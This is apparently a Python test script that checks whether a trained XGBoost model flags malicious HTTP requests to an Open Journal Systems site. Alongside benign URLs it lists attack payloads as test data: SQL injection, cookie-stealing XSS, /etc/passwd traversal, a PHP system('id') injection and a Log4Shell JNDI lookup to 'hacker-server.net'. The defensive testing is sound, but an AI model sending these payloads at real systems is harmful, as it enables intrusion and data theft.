"""Test ML model pada real OJS scenarios + zero-day attacks."""

import sys
from pathlib import Path

import pickle
import pandas as pd

PROJECT_ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(PROJECT_ROOT))

from src.preprocessing.tabular_features import build_tabular_features

# Load model
print("[INFO] Loading model...")
with open("models/trained_models/modsec_xgb.pkl", 'rb') as f:
    model = pickle.load(f)

test_cases = [
    # --- 1. NORMAL OJS TRAFFIC ---
    {"name": "Normal - Baca Abstrak Jurnal", "method": "GET", "uri": "/index.php/journal/article/view/1024"},
    {"name": "Normal - Pencarian Aman", "method": "GET", "uri": "/index.php/journal/search?query=machine+learning+di+era+digital"},
    {"name": "Normal - Upload Revisi Jurnal", "method": "POST", "uri": "/index.php/journal/authorDashboard/saveUpload"},
    {"name": "Normal - Akses CSS/JS Assets", "method": "GET", "uri": "/public/journals/1/style.css"},

    # --- 2. GENERIC ATTACKS ---
    {"name": "Attack - SQL Injection (Biasa)", "method": "GET", "uri": "/index.php/journal/search?query=1'+OR+'1'='1"},
    {"name": "Attack - Cross Site Scripting (XSS)", "method": "GET", "uri": "/index.php/journal/search?query=<script>alert(document.cookie)</script>"},
    {"name": "Attack - Path Traversal / LFI", "method": "GET", "uri": "/index.php/journal/article/download?file=../../../../../../etc/passwd"},
    {"name": "Attack - Admin Git Config", "method": "GET", "uri": "/.git/config"},

    # --- 3. ZERO-DAY / OBFUSCATED ATTACKS ---
    {"name": "ZeroDay - Obfuscated SQLi", "method": "GET", "uri": "/index.php/journal/search?query=%00'/**/uNiOn/**/sElEcT/**/@@version--"},
    {"name": "ZeroDay - RCE PHP Split String", "method": "GET", "uri": "/index.php/journal/search?q=s%20y%20s%20t%20e%20m('i'.'d')"},
    {"name": "ZeroDay - JNDI / Log4Shell Pattern", "method": "GET", "uri": "/?param=${jndi:ldap://hacker-server.net/a}"},
    {"name": "ZeroDay - Hex Encoded XSS", "method": "GET", "uri": "/index.php/journal/search?query=%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"}
]

print("\n" + "=" * 80)
print("ML MODEL DETECTION - OJS SCENARIOS")
print("=" * 80)

results = {"normal": 0, "detected": 0, "missed": 0}

for test in test_cases:
    name = test.pop("name")
    df = pd.DataFrame([test])
    X = build_tabular_features(df)
    
    pred = model.predict(X)[0]
    prob = model.predict_proba(X)[0, 1]
    
    # Determine expected
    if "Normal" in name:
        expected = 0
        results["normal"] += 1
    elif "ZeroDay" in name:
        expected = 1
        if pred == 1:
            results["detected"] += 1
        else:
            results["missed"] += 1
    else:
        expected = 1
        if pred == 1:
            results["detected"] += 1
        else:
            results["missed"] += 1
    
    # Display
    status = "[OK]" if pred == expected else "[FAIL]"
    attack_label = "[ATTACK]" if pred == 1 else "[NORMAL]"
    expected_label = "[Expected: ATTACK]" if expected == 1 else "[Expected: NORMAL]"
    
    print(f"\n{status} {attack_label} {expected_label}")
    print(f"   {name}")
    print(f"   Prob: {prob:.4f}")

print("\n" + "=" * 80)
print("SUMMARY")
print("=" * 80)
print(f"Normal traffic: {results['normal']}")
print(f"Attacks detected: {results['detected']}")
print(f"Attacks missed (False Negatives): {results['missed']}")
